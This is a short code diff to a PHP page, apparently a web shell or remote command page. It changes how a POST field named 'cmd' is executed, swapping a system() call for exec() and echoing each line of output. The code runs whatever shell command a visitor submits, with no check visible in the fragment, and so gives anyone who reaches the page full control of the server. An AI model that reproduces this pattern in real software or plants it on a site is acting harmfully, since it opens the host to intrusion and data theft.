@@ -116,8 +116,11 @@
 			<?php 
 				if (isset($_POST['cmd'])) {
 	 				$cm = $_POST['cmd'];
-	 				$ret = system($cm) . "<br>";
-
+					exec($cm,$ar);
+	 				foreach ($ar as $ret) {
+	 					echo $ret . "<br>";
+	 				}
+	 				// $ret = system($cm) . "<br>";
 	 			}else {
 	 				$ret = "";
 	 			}
